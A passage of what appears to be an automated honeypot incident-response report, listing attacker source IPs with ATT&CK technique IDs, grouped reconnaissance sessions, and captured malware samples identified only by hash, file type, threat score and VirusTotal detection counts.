| IR-eca9fee0170b | HIGH | `35.210.223[.]3` | 2026-11-10 07:29 | Y | 1 | 0 | `T1078` |
| IR-31ee9115cccc | HIGH | `35.210.223[.]3` | 2026-11-10 07:29 | Y | 0 | 0 | `T1078` |
| IR-51e28f8eec53 | HIGH | `139.59.133[.]86` | 2026-11-10 07:57 | Y | 2 | 0 | `T1078` |
| IR-0250a2a18cb3 | HIGH | `193.32.162[.]15` | 2026-11-10 08:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-de0081a4735c | HIGH | `35.210.231[.]84` | 2026-11-10 08:06 | Y | 3 | 0 | `T1078` |
| IR-112763f743f7 | HIGH | `35.210.231[.]84` | 2026-11-10 08:06 | Y | 1 | 0 | `T1078` |
| IR-a945e7a19db3 | HIGH | `35.210.231[.]84` | 2026-11-10 08:06 | Y | 0 | 0 | `T1078` |
| IR-ef194cb80727 | HIGH | `176.53.159[.]196` | 2026-11-10 08:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a70349330b47 | HIGH | `23.132.164[.]185` | 2026-11-10 08:22 | Y | 1 | 0 | `T1078 · T1592` |
| IR-28bad6a1ca42 | HIGH | `14.155.244[.]201` | 2026-11-10 09:17 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-139152e7a474 | HIGH | `14.155.244[.]201` | 2026-11-10 09:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-926c24829625 | HIGH | `45.131.108[.]217` | 2026-11-10 09:19 | Y | 2 | 0 | `T1078 · T1592` |
| IR-e38533c250be | HIGH | `45.131.108[.]217` | 2026-11-10 09:21 | Y | 2 | 0 | `T1078 · T1083 · T1592` |
| IR-debceba940e0 | HIGH | `45.131.108[.]217` | 2026-11-10 09:30 | Y | 2 | 0 | `T1078 · T1592` |
| IR-df5f7e5b934e | HIGH | `109.160.32[.]121` | 2026-11-10 09:32 | Y | 1 | 0 | `T1078 · T1592` |
| IR-06097826928b | HIGH | `157.66.47[.]161` | 2026-11-10 09:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-91b85a46af21 | HIGH | `157.66.47[.]161` | 2026-11-10 09:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2ad98a70ca66 | HIGH | `109.160.32[.]121` | 2026-11-10 10:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-0176ea879e75 | HIGH | `80.94.92[.]179` | 2026-11-10 10:11 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-4784af5864b3 | HIGH | `80.94.92[.]179` | 2026-11-10 10:13 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-b306512e948a | HIGH | `80.94.92[.]179` | 2026-11-10 10:15 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-6904a8753763 | HIGH | `80.94.92[.]179` | 2026-11-10 10:18 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-2ee156d24dd7 | HIGH | `80.94.92[.]179` | 2026-11-10 10:20 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-76497b48c387 | HIGH | `80.94.92[.]179` | 2026-11-10 10:23 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-4b559913fd9d | HIGH | `80.94.92[.]179` | 2026-11-10 10:27 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-106a361122af | HIGH | `176.53.159[.]196` | 2026-11-10 10:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3aa3e1883209 | HIGH | `80.94.92[.]179` | 2026-11-10 10:30 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-62397f809673 | HIGH | `104.237.145[.]228` | 2026-11-10 10:46 | Y | 3 | 0 | `T1078` |
| IR-7f63497a32d8 | HIGH | `4.206.92[.]183` | 2026-11-10 11:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c8715144a57c | HIGH | `4.206.92[.]183` | 2026-11-10 11:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b8a75c7a26bc | HIGH | `117.50.70[.]125` | 2026-11-10 11:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-da5a46971a11 | HIGH | `117.50.70[.]125` | 2026-11-10 11:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f0dd53f00aec | HIGH | `45.232.73[.]84` | 2026-11-10 11:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-36e7bb161be8 | HIGH | `45.232.73[.]84` | 2026-11-10 11:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9f2ad88a8918 | HIGH | `120.48.175[.]69` | 2026-11-10 11:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4a831c540b53 | HIGH | `120.48.175[.]69` | 2026-11-10 11:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cf06c5e42122 | HIGH | `78.128.112[.]74` | 2026-11-10 11:58 | Y | 1 | 0 | `T1078 · T1592` |
| IR-75698add9698 | HIGH | `139.198.113[.]29` | 2026-11-10 12:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-37b98a3bc917 | HIGH | `139.198.113[.]29` | 2026-11-10 12:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cb2aaf3fd9bb | HIGH | `118.25.27[.]204` | 2026-11-10 12:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3c5f87ee49b8 | HIGH | `43.160.246[.]215` | 2026-11-10 12:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c412e94d40b9 | HIGH | `43.160.246[.]215` | 2026-11-10 12:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e99b9c70844e | HIGH | `50.6.243[.]128` | 2026-11-10 12:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2fb273289f0d | HIGH | `50.6.243[.]128` | 2026-11-10 12:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-68ac4e30d849 | HIGH | `59.11.42[.]221` | 2026-11-10 12:33 | Y | 6 | 0 | `T1078` |
| IR-74c8d2bfae0c | HIGH | `176.53.159[.]196` | 2026-11-10 12:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3afca274730e | HIGH | `59.11.42[.]221` | 2026-11-10 12:35 | Y | 4 | 0 | `T1078` |
| IR-a937b2250449 | HIGH | `193.32.162[.]15` | 2026-11-10 12:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d504153bb0f8 | HIGH | `91.186.216[.]80` | 2026-11-10 12:51 | Y | 4 | 0 | `T1078` |
| IR-d982508bb14c | HIGH | `103.248.120[.]6` | 2026-11-10 12:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e205b5b66b2d | HIGH | `103.248.120[.]6` | 2026-11-10 12:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7800b4cedc26 | HIGH | `101.36.119[.]203` | 2026-11-10 13:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d44f7dcd5905 | HIGH | `101.36.119[.]203` | 2026-11-10 13:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-728189e81f87 | HIGH | `49.0.27[.]202` | 2026-11-10 13:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d3c90df5e7fc | HIGH | `49.0.27[.]202` | 2026-11-10 13:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9fb0134dd815 | HIGH | `179.184.0[.]32` | 2026-11-10 13:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cfd12640b975 | HIGH | `179.184.0[.]32` | 2026-11-10 13:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-79105673e735 | HIGH | `71.6.134[.]233` | 2026-11-10 14:00 | Y | 3 | 0 | `T1078` |
| IR-c6d468b9d98d | HIGH | `176.53.159[.]196` | 2026-11-10 14:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b8a0585f2844 | HIGH | `193.32.162[.]15` | 2026-11-10 14:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f48f6f31f3fa | HIGH | `144.22.238[.]238` | 2026-11-10 14:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-be48f9be52a4 | HIGH | `121.224.78[.]164` | 2026-11-10 15:13 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-b953ed4c6050 | HIGH | `121.224.78[.]164` | 2026-11-10 15:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-04152a4c0fb4 | HIGH | `185.227.152[.]135` | 2026-11-10 15:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4405d2656bde | HIGH | `185.227.152[.]135` | 2026-11-10 15:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-74c84f995b07 | HIGH | `4.210.91[.]174` | 2026-11-10 15:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0c35303da634 | HIGH | `4.210.91[.]174` | 2026-11-10 15:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-92c50f41d248 | HIGH | `176.53.159[.]196` | 2026-11-10 16:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2d578af12cfa | HIGH | `176.65.132[.]216` | 2026-11-10 16:03 | Y | 0 | 0 | `T1078` |
| IR-5bd9b538e63b | HIGH | `78.128.112[.]74` | 2026-11-10 16:29 | Y | 1 | 0 | `T1078 · T1592` |
| IR-888d88ed940b | HIGH | `103.102.46[.]200` | 2026-11-10 16:34 | Y | 1 | 0 | `T1078 · T1083 · T1592` |
| IR-59abd28062b0 | HIGH | `109.160.32[.]154` | 2026-11-10 16:52 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ca5e159385c6 | HIGH | `87.106.65[.]126` | 2026-11-10 17:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-46a6ec235210 | HIGH | `87.106.65[.]126` | 2026-11-10 17:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d5ab2615a19e | HIGH | `200.115.64[.]149` | 2026-11-10 17:02 | Y | 68 | 1 | `T1059.004 · T1078 · T1105` |
| IR-d4ceecaa6d33 | HIGH | `192.81.218[.]246` | 2026-11-10 17:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-18b10d4458b5 | HIGH | `192.81.218[.]246` | 2026-11-10 17:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ed8411f1da7c | HIGH | `58.220.39[.]200` | 2026-11-10 17:05 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1551cdd4d4a8 | HIGH | `58.220.39[.]200` | 2026-11-10 17:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-357aa86da8a0 | HIGH | `109.160.32[.]174` | 2026-11-10 17:22 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ac30410f3079 | HIGH | `45.14.225[.]216` | 2026-11-10 17:28 | Y | 1 | 0 | `T1078 · T1592` |
| IR-15f040004611 | HIGH | `167.172.68[.]136` | 2026-11-10 17:34 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e7c2b3268607 | HIGH | `103.102.46[.]200` | 2026-11-10 17:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2b7ff6020bdf | HIGH | `92.118.39[.]71` | 2026-11-10 17:50 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-b767102833eb | HIGH | `92.118.39[.]71` | 2026-11-10 17:53 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-bb8c9cf3c419 | HIGH | `50.47.143[.]233` | 2026-11-10 17:55 | Y | 9 | 0 | `T1057 · T1078 · T1083` |
| IR-83b1308a10b5 | HIGH | `92.118.39[.]71` | 2026-11-10 17:55 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-378cd32bcd54 | HIGH | `92.118.39[.]71` | 2026-11-10 17:58 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-485198fdf497 | HIGH | `109.160.32[.]174` | 2026-11-10 18:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-bae7c8d55b62 | HIGH | `109.160.32[.]154` | 2026-11-10 18:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-71f2252f4ed5 | HIGH | `92.118.39[.]71` | 2026-11-10 18:00 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-9ab20b6217a8 | HIGH | `49.0.87[.]123` | 2026-11-10 18:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
_… 12 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `109.160.32[.]121` | **2** | 2026-11-10 09:31 | 2026-11-10 10:27 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]174` | **2** | 2026-11-10 17:21 | 2026-11-10 18:43 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-10 13:51 | 2026-11-10 14:28 | 1m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-10 16:57 | 2026-11-10 18:09 | 1m | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | **2** | 2026-11-10 07:51 | 2026-11-10 09:14 | 2m | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | **2** | 2026-11-10 17:54 | 2026-11-10 18:09 | 2m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | **2** | 2026-11-10 12:39 | 2026-11-10 14:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | **2** | 2026-11-10 05:51 | 2026-11-10 06:05 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]71` | **2** | 2026-11-10 17:46 | 2026-11-10 18:05 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.102.46[.]200` | 1 | 2026-11-10 15:57 | 2026-11-10 15:57 | 3s | 0 | `T1592` | 🟢 LOW |
| `103.102.46[.]200` | 1 | 2026-11-10 17:57 | 2026-11-10 17:57 | 4s | 0 | `T1592` | 🟢 LOW |
| `103.122.228[.]61` | 1 | 2026-11-10 10:33 | 2026-11-10 10:33 | 33s | 0 | `T1592` | 🟢 LOW |
| `103.251.8[.]54` | 1 | 2026-11-10 07:30 | 2026-11-10 07:30 | 3s | 0 | `T1592` | 🟢 LOW |
| `104.2.52[.]42` | 1 | 2026-11-10 08:44 | 2026-11-10 08:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.237.145[.]228` | 1 | 2026-11-10 10:46 | 2026-11-10 10:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]154` | 1 | 2026-11-10 16:51 | 2026-11-10 16:51 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]41` | 1 | 2026-11-10 05:37 | 2026-11-10 05:37 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.101.230[.]131` | 1 | 2026-11-10 17:49 | 2026-11-10 17:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.224.78[.]164` | 1 | 2026-11-10 15:14 | 2026-11-10 15:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `138.68.16[.]163` | 1 | 2026-11-10 14:59 | 2026-11-10 14:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `141.76.94[.]39` | 1 | 2026-11-10 16:56 | 2026-11-10 16:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-11-10 11:44 | 2026-11-10 11:45 | 48s | 0 | `T1592` | 🟢 LOW |
| `146.120.251[.]229` | 1 | 2026-11-10 09:37 | 2026-11-10 09:37 | 14s | 0 | `T1592` | 🟢 LOW |
| `152.32.202[.]244` | 1 | 2026-11-10 13:00 | 2026-11-10 13:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `161.35.18[.]233` | 1 | 2026-11-10 05:16 | 2026-11-10 05:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `167.172.68[.]136` | 1 | 2026-11-10 17:34 | 2026-11-10 17:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.212.227[.]53` | 1 | 2026-11-10 15:33 | 2026-11-10 15:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]227` | 1 | 2026-11-10 08:43 | 2026-11-10 08:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.146.221[.]118` | 1 | 2026-11-10 08:38 | 2026-11-10 08:38 | 13s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]183` | 1 | 2026-11-10 14:21 | 2026-11-10 14:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `177.194.87[.]90` | 1 | 2026-11-10 14:53 | 2026-11-10 14:53 | 12s | 0 | `T1592` | 🟢 LOW |
| `178.128.23[.]205` | 1 | 2026-11-10 18:16 | 2026-11-10 18:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-11-10 07:49 | 2026-11-10 07:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.174.142[.]142` | 1 | 2026-11-10 12:44 | 2026-11-10 12:44 | 13s | 0 | `T1592` | 🟢 LOW |
| `181.28.151[.]211` | 1 | 2026-11-10 13:29 | 2026-11-10 13:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]12` | 1 | 2026-11-10 08:06 | 2026-11-10 08:06 | 8s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]183` | 1 | 2026-11-10 17:57 | 2026-11-10 17:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.188.124[.]2` | 1 | 2026-11-10 05:53 | 2026-11-10 05:54 | 39s | 0 | `T1592` | 🟢 LOW |
| `190.155.112[.]54` | 1 | 2026-11-10 17:40 | 2026-11-10 17:40 | 13s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-10 08:00 | 2026-11-10 08:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-11-10 13:06 | 2026-11-10 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `198.72.230[.]45` | 1 | 2026-11-10 10:37 | 2026-11-10 10:37 | 13s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]25` | 1 | 2026-11-10 09:08 | 2026-11-10 09:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.169.49[.]48` | 1 | 2026-11-10 05:58 | 2026-11-10 05:58 | 9s | 0 | `T1592` | 🟢 LOW |
| `200.36.211[.]96` | 1 | 2026-11-10 16:39 | 2026-11-10 16:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.50.163[.]65` | 1 | 2026-11-10 12:48 | 2026-11-10 12:48 | 33s | 0 | `T1592` | 🟢 LOW |
| `213.230.86[.]6` | 1 | 2026-11-10 17:39 | 2026-11-10 17:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `221.195.232[.]14` | 1 | 2026-11-10 10:40 | 2026-11-10 10:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `23.132.164[.]185` | 1 | 2026-11-10 08:22 | 2026-11-10 08:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.223[.]3` | 1 | 2026-11-10 07:29 | 2026-11-10 07:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.231[.]84` | 1 | 2026-11-10 08:06 | 2026-11-10 08:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.244[.]127` | 1 | 2026-11-10 06:52 | 2026-11-10 06:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.18.105[.]8` | 1 | 2026-11-10 06:26 | 2026-11-10 06:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.110.46[.]235` | 1 | 2026-11-10 16:46 | 2026-11-10 16:47 | 60s | 0 | `T1592` | 🟢 LOW |
| `38.110.46[.]237` | 1 | 2026-11-10 18:18 | 2026-11-10 18:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `4.150.188[.]1` | 1 | 2026-11-10 05:00 | 2026-11-10 05:00 | 10s | 0 | `T1592` | 🟢 LOW |
| `4.249.17[.]251` | 1 | 2026-11-10 11:03 | 2026-11-10 11:03 | 9s | 0 | `T1592` | 🟢 LOW |
| `43.228.157[.]68` | 1 | 2026-11-10 11:28 | 2026-11-10 11:29 | 30s | 0 | `T1592` | 🟢 LOW |
| `45.131.108[.]217` | 1 | 2026-11-10 09:14 | 2026-11-10 09:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.225.212[.]149` | 1 | 2026-11-10 08:45 | 2026-11-10 08:45 | 32s | 0 | `T1592` | 🟢 LOW |
| `45.63.4[.]69` | 1 | 2026-11-10 17:33 | 2026-11-10 17:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-11-10 12:54 | 2026-11-10 12:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-11-10 12:36 | 2026-11-10 12:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-11-10 15:36 | 2026-11-10 15:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.151.178[.]14` | 1 | 2026-11-10 16:21 | 2026-11-10 16:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.80.177[.]109` | 1 | 2026-11-10 15:43 | 2026-11-10 15:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]138` | 1 | 2026-11-10 12:32 | 2026-11-10 12:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]197` | 1 | 2026-11-10 12:29 | 2026-11-10 12:29 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]113` | 1 | 2026-11-10 12:32 | 2026-11-10 12:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]61` | 1 | 2026-11-10 09:32 | 2026-11-10 09:32 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]72` | 1 | 2026-11-10 12:31 | 2026-11-10 12:32 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]96` | 1 | 2026-11-10 18:34 | 2026-11-10 18:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]87` | 1 | 2026-11-10 17:08 | 2026-11-10 17:08 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-11-10 13:38 | 2026-11-10 13:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.240.236[.]109` | 1 | 2026-11-10 05:09 | 2026-11-10 05:09 | 10s | 0 | `T1592` | 🟢 LOW |
| `71.6.134[.]233` | 1 | 2026-11-10 13:28 | 2026-11-10 13:29 | 14s | 0 | `T1592` | 🟢 LOW |
| `71.90.30[.]53` | 1 | 2026-11-10 10:19 | 2026-11-10 10:20 | 50s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-10 07:16 | 2026-11-10 07:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-10 10:46 | 2026-11-10 10:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-10 06:10 | 2026-11-10 06:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-10 09:19 | 2026-11-10 09:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-10 18:45 | 2026-11-10 18:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-10 07:25 | 2026-11-10 07:25 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-10 11:58 | 2026-11-10 11:59 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-10 16:29 | 2026-11-10 16:30 | 6s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | 1 | 2026-11-10 10:25 | 2026-11-10 10:25 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.217.149[.]10` | 1 | 2026-11-10 10:29 | 2026-11-10 10:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]5` | 1 | 2026-11-10 06:22 | 2026-11-10 06:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.211.135[.]251` | 1 | 2026-11-10 10:27 | 2026-11-10 10:27 | 11s | 0 | `T1592` | 🟢 LOW |
| `91.225.162[.]250` | 1 | 2026-11-10 09:49 | 2026-11-10 09:50 | 10s | 0 | `T1592` | 🟢 LOW |
| `95.10.180[.]232` | 1 | 2026-11-10 06:00 | 2026-11-10 06:00 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
